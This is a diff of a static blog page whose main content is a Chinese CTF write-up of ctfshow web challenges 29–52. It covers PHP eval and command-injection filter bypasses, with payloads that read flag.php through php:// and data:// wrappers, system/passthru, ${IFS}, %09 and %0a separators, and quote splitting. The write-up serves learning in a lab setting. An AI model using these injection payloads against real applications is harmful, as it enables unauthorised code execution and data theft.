@@ -71,6 +71,45 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-web29" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2025/04/13/web29/" class="article-date">
+  <time class="dt-published" datetime="2025-04-13T13:16:51.000Z" itemprop="datePublished">2025-04-13</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2025/04/13/web29/">web29</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><img src="/2025/04/13/web29/$%7Bfiilename%7D/64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2025/04/13/web29/" data-id="cm9o8m07z000dzsuoeiao0ias" data-title="web29" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-ctfshow29-52" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2025/04/13/ctfshow29-52/" class="article-date">
@@ -93,7 +132,7 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p><img src="/.com//$%7Bfiilename%7D/64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg" alt="64ae6cbc-95ca-46c5-9f56-36f524cb1e94">!](.&#x2F;img&#x2F;64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg)</p>
+        <p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg" alt="64ae6cbc-95ca-46c5-9f56-36f524cb1e94">!](.&#x2F;img&#x2F;64ae6cbc-95ca-46c5-9f56-36f524cb1e94.jpg)</p>
 <p>Web29 eval函数表示把后面的内容当成php代码执行，</p>
 <ol>
 <li>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</li>
@@ -103,21 +142,21 @@
 <li>?c&#x3D;system(“ls”); 发现有flag.php,又system(“tac fla*”);</li>
 <li>?c&#x3D;echo <code>tac fla*</code>; 注意要用<code> </code>包起来 这个反引号代替了system函数</li>
 </ol>
-<p><img src="/.com//$%7Bfiilename%7D/b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225.jpg" alt="b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225">!](.&#x2F;img&#x2F;b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225.jpg" alt="b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225">!](.&#x2F;img&#x2F;b73fb13b-b2e4-4eb4-82a9-cbd6b2f6d225.jpg)</p>
 <p>System被过滤也可以用passthru来替代system执行系统命令</p>
-<p><img src="/.com//$%7Bfiilename%7D/d359d230-d3cc-45e6-a618-2404d84895db.jpg" alt="d359d230-d3cc-45e6-a618-2404d84895db">!](.&#x2F;img&#x2F;d359d230-d3cc-45e6-a618-2404d84895db.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/d359d230-d3cc-45e6-a618-2404d84895db.jpg" alt="d359d230-d3cc-45e6-a618-2404d84895db">!](.&#x2F;img&#x2F;d359d230-d3cc-45e6-a618-2404d84895db.jpg)</p>
 <p>31题 过滤了空格，可以使用%09替代；也可以使用$IFS$9，${IFS}，$IFS这三个都行</p>
 <p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac fla*”)；</p>
 <p>?c&#x3D;eval($_GET[1]);&amp;1&#x3D;passthru(“tac${IFS}$fla*”); 注意要用转义字符\</p>
-<p><img src="/.com//$%7Bfiilename%7D/32038e0e-fe67-4653-b5e1-e81652560b33.jpg" alt="32038e0e-fe67-4653-b5e1-e81652560b33">!](.&#x2F;img&#x2F;32038e0e-fe67-4653-b5e1-e81652560b33.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/32038e0e-fe67-4653-b5e1-e81652560b33.jpg" alt="32038e0e-fe67-4653-b5e1-e81652560b33">!](.&#x2F;img&#x2F;32038e0e-fe67-4653-b5e1-e81652560b33.jpg)</p>
 <p>32题 ?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("tac flag.php")?></p>
 <p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p><img src="/.com//$%7Bfiilename%7D/daad7edc-8f4e-4598-9ded-7ec6dac8cfb4.jpg" alt="daad7edc-8f4e-4598-9ded-7ec6dac8cfb4">!](.&#x2F;img&#x2F;daad7edc-8f4e-4598-9ded-7ec6dac8cfb4.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/daad7edc-8f4e-4598-9ded-7ec6dac8cfb4.jpg" alt="daad7edc-8f4e-4598-9ded-7ec6dac8cfb4">!](.&#x2F;img&#x2F;daad7edc-8f4e-4598-9ded-7ec6dac8cfb4.jpg)</p>
 <p>38题 看到include 用伪协议 过滤了php 用data ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system(“tac fla*”);?></p>
 <p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system("tac fla*")?> </p>
 <?=是简化的<?php echo...?>
 
-<p><img src="/.com//$%7Bfiilename%7D/9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5.jpg" alt="9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5">!](.&#x2F;img&#x2F;9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5.jpg" alt="9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5">!](.&#x2F;img&#x2F;9bf5bd18-acb2-4674-a5fe-8e3fdc46b8b5.jpg)</p>
 <p>40题?c&#x3D;echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));：这是一个GET请求的参数c，其值是一个PHP表达式。</p>
 <p>echo：PHP中的输出函数，用于输出字符串或表达式的结果。</p>
 <p>highlight_file：PHP中的函数，用于高亮显示PHP文件的内容。</p>
@@ -150,7 +189,7 @@
 <p>这段代码的目的是尝试执行flag.php文件的反向内容。</p>
 <p>​            </p>
 <p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/LongL_GuYu/article/details/140787997">https://blog.csdn.net/LongL_GuYu/article/details/140787997</a></p>
-<p><img src="/.com//$%7Bfiilename%7D/a8e336e1-6ad1-4687-abfe-ab869ccdb701.jpg" alt="a8e336e1-6ad1-4687-abfe-ab869ccdb701">!](.&#x2F;img&#x2F;a8e336e1-6ad1-4687-abfe-ab869ccdb701.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a8e336e1-6ad1-4687-abfe-ab869ccdb701.jpg" alt="a8e336e1-6ad1-4687-abfe-ab869ccdb701">!](.&#x2F;img&#x2F;a8e336e1-6ad1-4687-abfe-ab869ccdb701.jpg)</p>
 <p> dev&#x2F;null 2&gt;&amp;1 </p>
 <p><strong>·</strong> <em><strong>*command &gt; &#x2F;dev&#x2F;null*</strong></em> ：符号 &gt; 是重定向操作符，此命令将 command 的标准输出重定向到 &#x2F;dev&#x2F;null ，即正常运行结果被丢弃。例如 echo “Hello” &gt; &#x2F;dev&#x2F;null ，屏幕上不会显示 “Hello” 。</p>
 <p><strong>·</strong> <em><strong>*command 2&gt; &#x2F;dev&#x2F;null*</strong></em> ：2&gt; 用于将标准错误输出重定向，该命令会把 command 执行过程中产生的错误信息发送到 &#x2F;dev&#x2F;null 。比如 find &#x2F; -name non_existent_file 2&gt;&#x2F;dev&#x2F;null ，查找过程中因权限不足等产生的错误提示就不会显示 。</p>
@@ -166,36 +205,36 @@
 <p>当用于布尔值时，&amp; 也可以作为逻辑与运算符，但它不具有短路特性。无论第一个表达式的结果如何，都会计算第二个表达式。</p>
 <p>解法4 ?c&#x3D;ls%0a  ?c&#x3D;tac flag.php%0a 在 URL 编码里，%0a 代表换行符（\n） 换行符 \n 在 Unix&#x2F;Linux 系统的命令行里是命令的分隔符。所以，上述命令会先执行 ls 命令，该命令用于列出当前目录下的文件和文件夹。</p>
 <p>换行之后，&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 成为了另一个独立的命令。但这个命令并没有实际的命令主体，它只是一个空的重定向操作。</p>
-<p><img src="/.com//$%7Bfiilename%7D/a8d6efd1-702a-4b0c-ba05-50db366e5feb.jpg" alt="a8d6efd1-702a-4b0c-ba05-50db366e5feb">!](.&#x2F;img&#x2F;a8d6efd1-702a-4b0c-ba05-50db366e5feb.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a8d6efd1-702a-4b0c-ba05-50db366e5feb.jpg" alt="a8d6efd1-702a-4b0c-ba05-50db366e5feb">!](.&#x2F;img&#x2F;a8d6efd1-702a-4b0c-ba05-50db366e5feb.jpg)</p>
 <p>43 过滤了; tac flag.php|| 或者%0a 或者&amp; URL编码后%26 </p>
-<p><img src="/.com//$%7Bfiilename%7D/2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d.jpg" alt="2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d">!](.&#x2F;img&#x2F;2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d.jpg" alt="2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d">!](.&#x2F;img&#x2F;2654fbbe-a7d5-4ab2-b9c0-8790d6e05e7d.jpg)</p>
 <p>44 ?c&#x3D;tac fla*||</p>
-<p><img src="/.com//$%7Bfiilename%7D/35e0ef5d-1414-4704-a7a0-dd8b67a77765.jpg" alt="35e0ef5d-1414-4704-a7a0-dd8b67a77765">!](.&#x2F;img&#x2F;35e0ef5d-1414-4704-a7a0-dd8b67a77765.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/35e0ef5d-1414-4704-a7a0-dd8b67a77765.jpg" alt="35e0ef5d-1414-4704-a7a0-dd8b67a77765">!](.&#x2F;img&#x2F;35e0ef5d-1414-4704-a7a0-dd8b67a77765.jpg)</p>
 <p>45 过滤了空格用%09 ${IFS} ?c&#x3D;tac${IFS}fla*||</p>
-<p><img src="/.com//$%7Bfiilename%7D/6604ed43-bf17-4c5b-b1fb-46dd73f12222.jpg" alt="6604ed43-bf17-4c5b-b1fb-46dd73f12222">!](.&#x2F;img&#x2F;6604ed43-bf17-4c5b-b1fb-46dd73f12222.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/6604ed43-bf17-4c5b-b1fb-46dd73f12222.jpg" alt="6604ed43-bf17-4c5b-b1fb-46dd73f12222">!](.&#x2F;img&#x2F;6604ed43-bf17-4c5b-b1fb-46dd73f12222.jpg)</p>
 <p>46 过滤了空格数字  用%09 这里的 %09 被当作普通空白符处理 $被过滤 不能用${IFS} 空格还可以用&lt;或者&lt;&gt;代替空格</p>
 <p>?c&#x3D;tac%09fla?.php|| 过滤了* 用?也可以代替任意一个字符 </p>
-<p><img src="/.com//$%7Bfiilename%7D/a6bc6cd8-d169-447e-8103-00a611b7423e.jpg" alt="a6bc6cd8-d169-447e-8103-00a611b7423e">!](.&#x2F;img&#x2F;a6bc6cd8-d169-447e-8103-00a611b7423e.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a6bc6cd8-d169-447e-8103-00a611b7423e.jpg" alt="a6bc6cd8-d169-447e-8103-00a611b7423e">!](.&#x2F;img&#x2F;a6bc6cd8-d169-447e-8103-00a611b7423e.jpg)</p>
 <p>47 ?c&#x3D;tac%09fla?.php||  绕过flag还可以用f’’lag  在正则匹配中?代表通配符 但在正则匹配中 ?表示前面一个字符出现零次或一次</p>
 <p>48 49同上</p>
-<p><img src="/.com//$%7Bfiilename%7D/a6bc6cd8-d169-447e-8103-00a611b7423e-1744549925976-13.jpg" alt="a6bc6cd8-d169-447e-8103-00a611b7423e">!](.&#x2F;img&#x2F;a6bc6cd8-d169-447e-8103-00a611b7423e.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/a6bc6cd8-d169-447e-8103-00a611b7423e-1744549925976-13.jpg" alt="a6bc6cd8-d169-447e-8103-00a611b7423e">!](.&#x2F;img&#x2F;a6bc6cd8-d169-447e-8103-00a611b7423e.jpg)</p>
 <p>49 这里过滤了09 所以不能用%09代表空格 之前过滤%和数字 %09仍能用 过滤规则只是简单地查找并移除单个的百分号和数字字符，没有对连续的 %XX （XX 为十六进制数字）形式进行处理。所以 %09 会被当作普通字符序列保留下来，没有被过滤掉。</p>
-<p><img src="/.com//$%7Bfiilename%7D/78455c18-cb78-4c6e-a49e-7464ddcc5eed.jpg" alt="78455c18-cb78-4c6e-a49e-7464ddcc5eed">!](.&#x2F;img&#x2F;78455c18-cb78-4c6e-a49e-7464ddcc5eed.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/78455c18-cb78-4c6e-a49e-7464ddcc5eed.jpg" alt="78455c18-cb78-4c6e-a49e-7464ddcc5eed">!](.&#x2F;img&#x2F;78455c18-cb78-4c6e-a49e-7464ddcc5eed.jpg)</p>
 <p>50 ?c&#x3D;tac&lt;fla’’g.php|| </p>
-<p><img src="/.com//$%7Bfiilename%7D/2f3641b0-10f1-4962-b2a8-82703122f328.jpg" alt="2f3641b0-10f1-4962-b2a8-82703122f328">!](.&#x2F;img&#x2F;2f3641b0-10f1-4962-b2a8-82703122f328.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/2f3641b0-10f1-4962-b2a8-82703122f328.jpg" alt="2f3641b0-10f1-4962-b2a8-82703122f328">!](.&#x2F;img&#x2F;2f3641b0-10f1-4962-b2a8-82703122f328.jpg)</p>
 <p>51  ?c&#x3D;t’’ac&lt;fl’’ag.php%0a 过滤了tac 用t’’ac</p>
 <p>nl、more 和 vi 命令都可以用于查看文件内容，但在功能和使用方式上有所不同：</p>
 <p><strong>·</strong> <em><strong>*nl*</strong></em> <em><strong>*命令*</strong></em>：主要用于显示文件内容，并为每行加上行号。例如，执行 nl file.txt 会将 file.txt 的内容逐行显示出来，同时在每行前面加上对应的行号，方便用户对文件中的行进行定位和引用。</p>
 <p><strong>·</strong> <em><strong>*more*</strong></em> <em><strong>*命令*</strong></em>：用于分页显示文件内容。当文件内容较多，一屏无法完全显示时，more 会将文件内容按页显示，用户可以通过按空格键或回车键等方式逐页或逐行查看文件内容。例如，more large_file.txt 会以分页的形式显示 large_file.txt 的内容，便于用户查看。</p>
 <p><strong>·</strong> <em><strong>*vi*</strong></em> <em><strong>*命令*</strong></em>：不仅可以查看文件内容，还能对文件进行编辑。使用 vi 打开文件后，默认处于命令模式，用户可以通过各种命令进行光标移动、文本查找等操作来查看文件内容。若要对文件进行修改，则需进入插入模式。例如，vi config.php 可以打开 config.php 文件进行查看和编辑。</p>
-<p><img src="/.com//$%7Bfiilename%7D/82bcfa46-9fb3-4213-b1ae-e10853679a2c.jpg" alt="82bcfa46-9fb3-4213-b1ae-e10853679a2c">!](.&#x2F;img&#x2F;82bcfa46-9fb3-4213-b1ae-e10853679a2c.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/82bcfa46-9fb3-4213-b1ae-e10853679a2c.jpg" alt="82bcfa46-9fb3-4213-b1ae-e10853679a2c">!](.&#x2F;img&#x2F;82bcfa46-9fb3-4213-b1ae-e10853679a2c.jpg)</p>
 <p>52 ?c&#x3D;nl${IFS}&#x2F;fla’’g%0a &lt;被过滤 用${IFS}&#x2F; </p>
-<p><img src="/.com//$%7Bfiilename%7D/eec2ce71-c80c-41a0-b45e-691b2770eaff.jpg" alt="eec2ce71-c80c-41a0-b45e-691b2770eaff">!](.&#x2F;img&#x2F;eec2ce71-c80c-41a0-b45e-691b2770eaff.jpg)</p>
+<p><img src="/2025/04/13/ctfshow29-52/$%7Bfiilename%7D/eec2ce71-c80c-41a0-b45e-691b2770eaff.jpg" alt="eec2ce71-c80c-41a0-b45e-691b2770eaff">!](.&#x2F;img&#x2F;eec2ce71-c80c-41a0-b45e-691b2770eaff.jpg)</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/ctfshow29-52/" data-id="cm9o1n3sv0008xcuof05dbq81" data-title="ctfshow29-52" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/13/ctfshow29-52/" data-id="cm9o8m07y0009zsuogd87aqxv" data-title="ctfshow29-52" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -244,7 +283,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/" data-id="cm9o1n3st0004xcuo5ffc61kz" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/13/ctfshow%20web29-52%20(%E9%83%A8%E5%88%86%EF%BC%89/" data-id="cm9o8m07x0007zsuoal3i5bg3" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -276,7 +315,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/ctfshow%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cm9o1n3sv0006xcuoaqen0pze" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/13/ctfshow%20%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="cm9o8m07w0005zsuo0p7t8ofq" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -314,7 +353,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/ctf/" data-id="cm9o1n3st0003xcuohov88473" data-title="ctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/13/ctf/" data-id="cm9o8m07v0003zsuod6gp65n6" data-title="ctf" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -353,7 +392,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/robots.txt/" data-id="cm9o1n3su0005xcuo5nds5nw7" data-title="信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/13/robots.txt/" data-id="cm9o8m07x0008zsuo7cr3chb4" data-title="信息收集" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -392,7 +431,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cm9o1n3sy000gxcuo50k2g423" data-title="robots.txt" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" data-id="cm9o8m080000gzsuoe2m15rqq" data-title="robots.txt" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -431,7 +470,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/13/blog/" data-id="cm9o1n3sr0001xcuo34it6f8c" data-title="blog" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/13/blog/" data-id="cm9o8m07v0002zsuoechs8l1c" data-title="blog" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -470,7 +509,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/09/My-New-Blog-Post/" data-id="cm9o1n3sp0000xcuo8tv0cxk1" data-title="My New Blog Post" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/09/My-New-Blog-Post/" data-id="cm9o8m07u0001zsuo8erc7hnq" data-title="My New Blog Post" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -521,7 +560,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2025/04/07/hello-world/" data-id="cm9o1n3sx000cxcuo3irh53em" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2025/04/07/hello-world/" data-id="cm9o8m07x0006zsuo5vh56uey" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -569,6 +608,10 @@
       <ul>
         
           <li>
+            <a href="/2025/04/19/1/">1</a>
+          </li>
+        
+          <li>
             <a href="/2025/04/19/blog0/">blog0</a>
           </li>
         
@@ -582,10 +625,6 @@
         
           <li>
             <a href="/2025/04/19/yy/">yy</a>
-          </li>
-        
-          <li>
-            <a href="/2025/04/19/some/">some</a>
           </li>
         
       </ul>
